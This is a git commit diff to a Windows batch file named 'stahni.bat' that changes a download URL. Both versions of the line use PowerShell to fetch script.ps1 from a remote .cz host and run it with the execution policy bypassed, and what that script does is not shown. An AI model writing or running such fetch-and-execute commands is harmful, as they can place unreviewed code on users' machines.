ce724cc4a8d499e08855cc08a90c469c91b92390
antiproton-matter <166539466+antiproton-matter@users.noreply.github.com>
2025-03-06 11:22:55 +0100

    Update stahni.bat

--- stahni.bat
+++ stahni.bat
@@ -1,3 +1,3 @@
 @echo off
-powershell -Command "& {Invoke-WebRequest -Uri 'https://25.plrp.cz/script.ps1' -OutFile 'script.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File script.ps1'}"
+powershell -Command "& {Invoke-WebRequest -Uri 'https://25plrp.cz/script.ps1' -OutFile 'script.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File script.ps1'}"
 PAUSE
